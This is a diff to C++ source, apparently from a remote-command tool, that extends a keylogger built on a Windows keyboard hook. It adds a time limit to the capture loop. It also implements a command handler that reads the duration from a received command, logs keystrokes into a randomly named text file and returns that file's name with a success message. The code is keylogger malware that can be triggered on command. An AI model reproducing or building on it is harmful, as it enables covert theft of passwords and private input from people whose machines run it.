@@ -3,7 +3,7 @@
 std::mutex logMutex;
 std::string logData;
 
-bool Services::keyLogger(const std::string &saveFile) {  
+bool Services::keyLogger(const std::string &saveFile, int T) {  
     std::ofstream fout(saveFile.c_str());  
     if (!fout.is_open()) {  
         return false;  
@@ -18,6 +18,7 @@ bool Services::keyLogger(const std::string &saveFile) {
         return false;  
     }  
 
+    auto start = std::chrono::steady_clock::now();
     MSG msg;  
     while (true) {  
         {  
@@ -34,6 +35,11 @@ bool Services::keyLogger(const std::string &saveFile) {
             TranslateMessage(&msg);  
             DispatchMessage(&msg);  
         }  
+        auto now = std::chrono::steady_clock::now();
+
+        std::chrono::duration<double> elapsed = now - start; 
+        // Check if the elapsed time is greater than or equal to T seconds 
+        if (elapsed.count() >= T) { break; }
     }  
 
     UnhookWindowsHookEx(hook);  
@@ -42,7 +48,20 @@ bool Services::keyLogger(const std::string &saveFile) {
 }
 
 std::vector<std::string> Services::keyLogger(Command command) {
-    return std::vector<std::string> ();
+    std::string response;
+    std::string filename = Command::generateFilepath(10, ".txt");
+    std::vector<std::string> result;
+
+    int T = std::stoi(command.listOption.back());
+    if (keyLogger(filename, T)) {
+        response = "Hook successfully!";
+        result.push_back(filename);
+    }
+    else {
+        response = "Cannot hook...";
+    }
+    result.push_back(response);
+    return result;
 }
 
 bool SpecialKeys(int S_Key) {
